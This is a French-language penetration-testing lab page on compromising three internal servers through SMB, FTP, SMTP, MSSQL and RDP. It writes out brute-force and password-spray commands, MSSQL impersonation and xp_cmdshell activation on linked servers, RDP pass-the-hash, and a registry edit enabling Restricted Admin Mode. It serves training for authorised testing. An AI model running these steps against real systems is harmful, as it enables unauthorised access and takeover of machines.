# Lab - Exploitation de services courants

Trois serveurs internes à auditer, chacun exposant un ensemble différent de services. L'objectif est de combiner les techniques vues dans ce module (énumération, brute force, exploitation protocolaire, mouvement latéral) pour obtenir un accès complet à chaque machine.

## Scénario

On intervient en test d'intrusion interne pour une entreprise qui souhaite évaluer la sécurité de trois serveurs. Chaque serveur a un rôle différent dans l'infrastructure :

- **Serveur 1** : gestion des emails, des clients et de leurs fichiers. Services attendus : SMTP, FTP, SMB, bases de données
- **Serveur 2** : serveur interne multi-services. Services attendus : variés, à découvrir par énumération
- **Serveur 3** : gestion de fichiers et de documents internes avec une base de données. Services attendus : SMB, MSSQL, RDP

L'accès initial se fait sans identifiants. L'objectif est de démontrer qu'un attaquant positionné sur le réseau interne peut progressivement compromettre chaque machine.

## Approche

La méthodologie est la même pour chaque serveur, adaptée aux services découverts :

1. **Scan complet** : identifier tous les ports ouverts et les versions de services avec `nmap -sCV -p- -T4`
2. **Tester les accès anonymes** : sessions nulles SMB, FTP anonyme, accès base de données sans mot de passe
3. **Énumérer les utilisateurs** : via SMB (rpcclient, enum4linux), SMTP (VRFY/RCPT TO), partages de fichiers
4. **Brute force / password spray** : cibler les services accessibles avec les utilisateurs découverts
5. **Explorer les données** : une fois authentifié, chercher des identifiants, des configurations, des clés dans les partages, les boîtes mail et les bases de données
6. **Escalader** : utiliser les informations trouvées pour obtenir un accès plus privilégié (impersonation MSSQL, PtH RDP, linked servers)

{% hint style="success" %}
Chaque serveur fournit les indices nécessaires pour l'étape suivante. Un fichier découvert dans un partage SMB peut contenir des identifiants pour une base de données, qui elle-même permet de pivoter vers un accès administrateur.
{% endhint %}

## Commandes

### Phase de reconnaissance

```bash
# - Scan complet d'un serveur
nmap -sCV -Pn -p- -T4 <IP_CIBLE> -oN scan_results.txt

# - Tester l'accès anonyme SMB
smbclient -N -L //<IP_CIBLE>
smbmap -H <IP_CIBLE>

# - Tester l'accès anonyme FTP
ftp <IP_CIBLE>
# login: anonymous

# - Énumérer les utilisateurs SMTP
smtp-user-enum -M RCPT -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt \
    -D domaine.htb -t <IP_CIBLE>
```

### Phase d'exploitation

```bash
# - Password spray SMB
crackmapexec smb <IP_CIBLE> -u utilisateurs.txt -p 'MotDePasse' --local-auth

# - Password spray RDP
crowbar -b rdp -s <IP_CIBLE>/32 -U utilisateurs.txt -c 'MotDePasse'

# - Brute force sur un service mail
hydra -l utilisateur@domaine.htb -P passwords.txt -s 587 smtp://<IP_CIBLE>

# - Connexion MSSQL
mssqlclient.py utilisateur@<IP_CIBLE> -p 1433 -windows-auth
```

### Phase de post-exploitation MSSQL

```sql
-- Vérifier les droits d'impersonation
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Impersonner un utilisateur
EXECUTE AS LOGIN = 'sa'
GO

-- Vérifier les serveurs liés
SELECT srvname, isremote FROM sysservers
GO

-- Exécuter des commandes sur un serveur lié
EXECUTE('select @@servername, system_user, is_srvrolemember(''sysadmin'')') AT [SERVEUR\INSTANCE]
GO

-- Activer xp_cmdshell sur un serveur lié
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1; RECONFIGURE') AT [SERVEUR\INSTANCE]
GO
EXECUTE('EXECUTE sp_configure ''xp_cmdshell'', 1; RECONFIGURE') AT [SERVEUR\INSTANCE]
GO

-- Exécuter une commande système
EXECUTE('xp_cmdshell ''whoami''') AT [SERVEUR\INSTANCE]
GO
```

### Phase d'accès RDP

```bash
# - Connexion RDP avec identifiants
xfreerdp /v:<IP_CIBLE> /u:utilisateur /p:'MotDePasse' /cert-ignore

# - PtH RDP (si Restricted Admin Mode activé)
xfreerdp /v:<IP_CIBLE> /u:administrateur /pth:<HASH_NT> /cert-ignore

# - Activer Restricted Admin Mode (depuis un accès existant)
reg add HKLM\System\CurrentControlSet\Control\Lsa \
    /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## Ce qu'on en retient

- L'énumération exhaustive est la clé. Un scan complet de ports avec identification de versions révèle souvent des services inattendus qui deviennent le point d'entrée
- Les partages SMB anonymes sont le premier réflexe en pentest interne. Les utilisateurs y laissent régulièrement des fichiers contenant des identifiants (notes, scripts, configurations)
- L'enchaînement SMB vers MSSQL vers linked server est un chemin classique pour passer d'un accès sans privilèges à `NT AUTHORITY\SYSTEM`. L'impersonation et les serveurs liés sont des fonctionnalités SQL légitimes que les administrateurs oublient souvent de restreindre
- Le RDP Pass-the-Hash est sous-utilisé par les pentesters. Quand on a un hash admin mais pas le mot de passe, et qu'on a besoin d'un accès graphique, c'est la solution
- En conditions réelles, documenter chaque étape de la chaîne d'exploitation. Le rapport doit montrer comment un accès anonyme initial mène, étape par étape, à un contrôle complet du serveur

{% hint style="info" %}
Ces labs reflètent des configurations fréquemment rencontrées en entreprise. La difficulté ne vient pas de vulnérabilités complexes mais de la capacité à combiner des faiblesses individuellement mineures (accès anonyme, mot de passe faible, privilèges excessifs) en une chaîne d'exploitation complète.
{% endhint %}

***
